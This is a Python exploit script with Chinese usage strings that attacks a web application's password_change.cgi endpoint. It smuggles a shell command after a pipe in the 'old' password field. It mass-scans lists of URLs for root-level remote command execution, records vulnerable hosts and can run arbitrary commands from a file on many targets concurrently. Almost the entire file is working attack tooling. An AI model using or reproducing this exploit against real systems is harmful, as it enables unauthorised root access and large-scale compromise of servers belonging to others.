from gevent import monkey;monkey.patch_all()
from multiprocessing import  Process
from gevent.lock import RLock
from bs4 import BeautifulSoup
import requests
import gevent
import warnings
import optparse
import os
import re

locks=RLock()

warnings.filterwarnings("ignore")
class Rce_exploit(object):
    def __init__(self):
        self.calc=0
        self.xcs=[]
        self.djcs=[]
        self.payloads={}
        self.commands=None
        self.data='user=cnmb&pam=&expired=2&old=test | id&new1=test2&new2=test2'
        for r in self.data.split('&'):
            key,value=r.split('=',1)
            self.payloads[key]=value
    def agtstet(self):
        parse='python scan.py -u [url] -> 单个检测\n' \
              'python scan.py -f [file] ->批量检测 \n' \
              'python scan,py -u [url] -c [command.txt] ->执行自定义命令\n' \
              'python scan.py -f [file] -c [command.txt] ->批量执行自定义命令'

        opt=optparse.OptionParser(parse)
        opt.add_option('-u',dest='geturl',help='单个url检测')
        opt.add_option('-f',dest='getfile',help='批量检测')
        opt.add_option('-c',dest='shell',help='利用')
        (options,args)=opt.parse_args()
        if options.geturl and options.shell:
            self.execute(options.geturl, options.shell)
        elif options.getfile and options.shell:
            self.commands=options.shell
            self.djc(options.getfile,1)
        elif options.geturl:
            self.scanner(options.geturl)
        elif options.getfile:
            self.djc(options.getfile,0)
        else:
            opt.print_help()
            exit()


    def execute(self,url,command):
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{}/sesss.cgi'.format(url)}
        payloads={'user': 'cnmb', 'pam': '', 'expired': '2', 'old': 'test | {}'.format(open(command,'r').read()), 'new1': 'test2', 'new2': 'test2'}
        url = '{}/password_change.cgi'.format(url)
        try:
            rqt=requests.post(url=url,headers=headers,data=payloads,allow_redirects=False,verify=False,timeout=30)
            html=BeautifulSoup(rqt.text,'html.parser')
            for g in html.find_all('center'):
                print('url:{} command:{}'.format(rqt.url,g.get_text()))

        except Exception as r:
            print(r)

    def scanner(self,url):
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{}/sesss.cgi'.format(url)}
        payloads=self.payloads
        url = '{}/password_change.cgi'.format(url)
        try:
            rqt = requests.post(url=url, headers=headers,data=payloads,allow_redirects=False,verify=False,timeout=30)
            if 'id=0(root) gid=0(root) groups=0(root)' in rqt.text:
                print('[+] 存在RCE:{}'.format(rqt.url))
                print(rqt.url,file=open('save.txt','a'))
            else:
                print('[-] 不存在RCE:{}'.format(rqt.url))
        except Exception as r:
            print('[-] Error:{}'.format(r))


    def xc(self,rw,id):
        locks.acquire()
        if id==0:
            for r in rw:
                self.xcs.append(gevent.spawn(self.scanner,r))
        else:
            for r in rw:
                self.xcs.append(gevent.spawn(self.execute,r,self.commands))
        locks.release()

        gevent.joinall(self.xcs)

    def djc(self,file,id):
        if os.path.exists(file):
            dk=open(file)
            for p in dk.readlines():
                data="".join(p.split('\n'))
                if self.calc==30:
                    p=Process(target=self.xc,args=(self.djcs,id))
                    p.start()
                    self.djcs.clear()
                    self.calc=0

                self.djcs.append(data)
                self.calc+=1

        if len(self.djcs)!=0:
            p = Process(target=self.xc, args=(self.djcs,id))
            p.start()

if __name__ == '__main__':
    obj=Rce_exploit()
    obj.agtstet()